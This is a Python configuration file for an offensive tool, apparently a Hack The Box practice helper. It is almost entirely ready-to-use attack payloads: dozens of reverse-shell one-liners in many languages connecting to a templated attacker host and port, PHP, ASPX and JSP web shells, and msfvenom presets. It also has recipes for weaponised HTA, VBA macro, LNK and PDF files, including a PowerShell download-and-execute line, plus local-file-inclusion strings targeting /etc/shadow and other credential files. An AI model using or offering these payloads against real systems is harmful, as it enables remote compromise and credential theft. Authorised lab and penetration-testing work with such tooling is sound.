"""
HTB Tool — Global Configuration & Defaults
"""
import os
from pathlib import Path


# ── Directories ──────────────────────────────────────────────────────────────
PROJECTS_DIR = Path.home() / ".htb_projects"
CONFIG_FILE = Path.home() / ".htb_tool.yaml"

# ── Network ──────────────────────────────────────────────────────────────────
DEFAULT_VPN_INTERFACE = "tun0"
DEFAULT_LPORT = 4444
DEFAULT_THREADS = 50

# ── Wordlists ────────────────────────────────────────────────────────────────
WORDLISTS_DIR = Path("/usr/share/wordlists")
SECLISTS_DIR = Path("/usr/share/seclists")

DIR_WORDLIST = WORDLISTS_DIR / "dirb" / "common.txt"
DIR_WORDLIST_BIG = WORDLISTS_DIR / "dirb" / "big.txt"
DNS_WORDLIST = (
    SECLISTS_DIR / "Discovery" / "DNS" / "subdomains-top1million-5000.txt"
)
VHOST_WORDLIST = (
    SECLISTS_DIR / "Discovery" / "DNS" / "subdomains-top1million-5000.txt"
)
WEB_EXTENSIONS = "php,html,txt,bak,old,asp,aspx,jsp,cgi,xml,json,conf,log,zip"

# ── Scan Defaults ────────────────────────────────────────────────────────────
NMAP_DEFAULT_TIMING = "T4"
NMAP_TOP_PORTS = 1000
NMAP_UDP_TOP_PORTS = 100
RUSTSCAN_DEFAULT_PORTS = 65535
MASSCAN_DEFAULT_RATE = 1000

# ── Payload Templates ────────────────────────────────────────────────────────
REVERSE_SHELL_TEMPLATES = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "bash-encoded": '/bin/bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
    "sh": "/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "python": (
        'python -c \'import socket,subprocess,os;'
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        's.connect(("{lhost}",{lport}));'
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "python3": (
        'python3 -c \'import socket,subprocess,os;'
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        's.connect(("{lhost}",{lport}));'
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "php": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "perl": (
        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
        'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''),
    "ruby": (
        "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
        'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
    ),
    "nc": "nc -e /bin/sh {lhost} {lport}",
    "nc-mkfifo": (
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    ),
    "nc-c": "nc -c /bin/sh {lhost} {lport}",
    "socat": (
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
    ),
    "powershell": (
        "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};"
        "$client.Close()"
    ),
    "powershell-base64": "__SPECIAL_PS_B64__",  # handled programmatically
    "java": (
        'Runtime r = Runtime.getRuntime();'
        'Process p = r.exec(new String[]{{"/bin/bash","-c",'
        '"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}});'
        'p.waitFor();'
    ),
    "groovy": (
        'String host="{lhost}";int port={lport};'
        'String cmd="/bin/bash";Process p=["bash","-c",'
        'cmd+" -i >& /dev/tcp/"+host+"/"+port+" 0>&1"].execute();'
    ),
    "lua": (
        "lua -e \"require('socket');require('os');"
        "t=socket.tcp();t:connect('{lhost}','{lport}');"
        "os.execute('/bin/sh -i <&3 >&3 2>&3');\""
    ),
    "node": (
        "(function(){{"
        "var net = require('net'),"
        "cp = require('child_process'),"
        "sh = cp.spawn('/bin/sh', []);"
        "var client = new net.Socket();"
        "client.connect({lport}, '{lhost}', function(){{"
        "client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});"
        "return /a/;}})();"
    ),
    "awk": (
        "awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell> \" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'"
    ),
    "ruby-sh": (
        "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{lhost}\",{lport}))'"
    ),
    "python3-short": (
        "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
    ),
    "python-short": (
        "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
    ),
    "zsh": (
        "zsh -c 'zmodload zsh/net/tcp && ztcp {lhost} {lport} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
    ),
    "php-exec": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php-system": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});system(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php-passthru": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php-shell_exec": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "php-popen": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
    ),
    "telnet": (
        "TF=$(mktemp -u);mkfifo $TF && telnet {lhost} {lport} 0<$TF | /bin/sh 1>$TF"
    ),
    "c": (
        "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){{\n    int port = {lport};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;\n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{lhost}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {{\"sh\", NULL}};\n    execve(\"/bin/sh\", argv, NULL);\n\n    return 0;\n}}"
    ),
    "dart": (
        "import 'dart:io';import 'dart:convert';main() {{Socket.connect(\"{lhost}\", {lport}).then((socket) {{Process.start('sh', []).then((Process process) {{socket.listen((List<int> s) {{process.stdin.add(s);}});process.stdout.listen((List<int> s) {{socket.add(s);}});process.stderr.listen((List<int> s) {{socket.add(s);}});}});}});}}"
    ),
    "rust": (
        "use std::net::TcpStream;use std::os::unix::io::{{AsRawFd, FromRawFd}};use std::process::{{Command, Stdio}};fn main() {{let s = TcpStream::connect(\"{lhost}:{lport}\").unwrap();let fd = s.as_raw_fd();Command::new(\"/bin/sh\").arg(\"-i\").stdin(unsafe {{ Stdio::from_raw_fd(fd) }}).stdout(unsafe {{ Stdio::from_raw_fd(fd) }}).stderr(unsafe {{ Stdio::from_raw_fd(fd) }}).spawn().unwrap().wait().unwrap();}}"
    ),
    "golang": (
        "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
    ),
}

# ── Webshell Templates ───────────────────────────────────────────────────────
WEBSHELL_TEMPLATES = {
    "php": '<?php system($_GET["cmd"]); ?>',
    "php-passthru": '<?php passthru($_GET["cmd"]); ?>',
    "php-exec": '<?php echo exec($_GET["cmd"]); ?>',
    "php-shell-exec": '<?php echo shell_exec($_GET["cmd"]); ?>',
    "php-popen": '<?php $h=popen($_GET["cmd"],"r");echo fread($h,4096);pclose($h); ?>',
    "aspx": (
        '<%@ Page Language="C#" %>'
        '<%@ Import Namespace="System.Diagnostics" %>'
        '<%= Process.Start(new ProcessStartInfo("cmd","/c "+Request["cmd"])'
        '{UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd() %>'
    ),
    "jsp": (
        '<%Runtime rt = Runtime.getRuntime();'
        'String[] cmd = {"/bin/sh","-c",request.getParameter("cmd")};'
        'Process p = rt.exec(cmd);'
        'java.io.InputStream is = p.getInputStream();'
        'int c;while((c=is.read())!=-1) out.print((char)c);%>'
    ),
}

# ── msfvenom Presets ─────────────────────────────────────────────────────────
MSFVENOM_PRESETS = {
    "linux-tcp": {
        "payload": "linux/x64/shell_reverse_tcp",
        "format": "elf",
        "extension": "elf",
    },
    "linux-meterpreter": {
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "format": "elf",
        "extension": "elf",
    },
    "windows-tcp": {
        "payload": "windows/x64/shell_reverse_tcp",
        "format": "exe",
        "extension": "exe",
    },
    "windows-meterpreter": {
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "format": "exe",
        "extension": "exe",
    },
    "windows-staged": {
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "format": "exe",
        "extension": "exe",
    },
    "php-tcp": {
        "payload": "php/reverse_php",
        "format": "raw",
        "extension": "php",
    },
    "php-meterpreter": {
        "payload": "php/meterpreter/reverse_tcp",
        "format": "raw",
        "extension": "php",
    },
    "python-tcp": {
        "payload": "cmd/unix/reverse_python",
        "format": "raw",
        "extension": "py",
    },
    "java-war": {
        "payload": "java/jsp_shell_reverse_tcp",
        "format": "war",
        "extension": "war",
    },
    "asp-tcp": {
        "payload": "windows/shell_reverse_tcp",
        "format": "asp",
        "extension": "asp",
    },
    "aspx-tcp": {
        "payload": "windows/x64/shell_reverse_tcp",
        "format": "aspx",
        "extension": "aspx",
    },
}

# ── Payload Categories ───────────────────────────────────────────────────────
PAYLOAD_CATEGORIES = {
    "Windows": ["powershell", "powershell-base64", "java", "ruby", "nc", "socat", "c", "rust", "golang", "nc-mkfifo", "awk"],
    "Linux": ["bash", "bash-encoded", "sh", "python", "python3", "python-short", "python3-short", "nc", "nc-mkfifo", "nc-c", "socat", "zsh", "telnet", "awk", "c", "rust", "golang", "ruby", "ruby-sh", "java", "perl", "lua", "dart", "php-exec", "php-shell_exec"],
    "Web": ["php", "php-exec", "php-system", "php-passthru", "php-shell_exec", "php-popen"]
}

# ── File Payloads ────────────────────────────────────────────────────────────
FILE_PAYLOADS = {
    "hta-psh": {
        "description": "HTML Application (HTA) with PowerShell",
        "ext": "hta",
        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f hta-psh -o {outfile}",
        "group": "Windows",
        "type": "command"
    },
    "vba-macro": {
        "description": "MS Office VBA Macro",
        "ext": "vba",
        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f vba -o {outfile}",
        "group": "Windows",
        "type": "command"
    },
    "psh-script": {
        "description": "PowerShell Script (.ps1)",
        "ext": "ps1",
        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f psh-cmd -o {outfile}",
        "group": "Windows",
        "type": "command"
    },
    "exe-service": {
        "description": "Windows Service Executable",
        "ext": "exe",
        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe-service -o {outfile}",
        "group": "Windows",
        "type": "command"
    },
    "lnk-shortcut": {
        "description": "Malicious LNK Target String",
        "ext": "txt",
        "content_template": "Create a windows shortcut (.lnk) with the following target:\n\npowershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')\"",
        "group": "Windows",
        "type": "text"
    },
    "doc-macro": {
        "description": "Word Document embedded macro instructions",
        "ext": "txt",
        "content_template": "Create a 'vba-macro' payload first.\nOpen Word -> View -> Macros -> Create.\nPaste the VBA code into the document macro editor, save as .docm.",
        "group": "Windows",
        "type": "text"
    },
    "pdf-adobe": {
        "description": "Adobe PDF Embedded EXE instructions",
        "ext": "txt",
        "content_template": "To generate an infected PDF, use msfconsole:\nuse exploit/windows/fileformat/adobe_pdf_embedded_exe\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nset FILENAME shell.pdf\nexploit",
        "group": "Windows",
        "type": "text"
    },
    "bash-script": {
        "description": "Linux Bash Script via msfvenom",
        "ext": "sh",
        "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f sh -o {outfile}",
        "group": "Linux",
        "type": "command"
    }
}

# ── LFI Payloads ─────────────────────────────────────────────────────────────
LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/auth.log",
    "/var/log/apache2/access.log",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
]

# ── Helpers ──────────────────────────────────────────────────────────────────


def get_tun0_ip() -> str | None:
    """Get IP address of tun0 (HTB VPN) interface."""
    import subprocess
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", DEFAULT_VPN_INTERFACE],
            capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.split("\n"):
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return None


def ensure_projects_dir() -> Path:
    """Ensure the projects directory exists and return its path."""
    PROJECTS_DIR.mkdir(parents=True, exist_ok=True)
    return PROJECTS_DIR
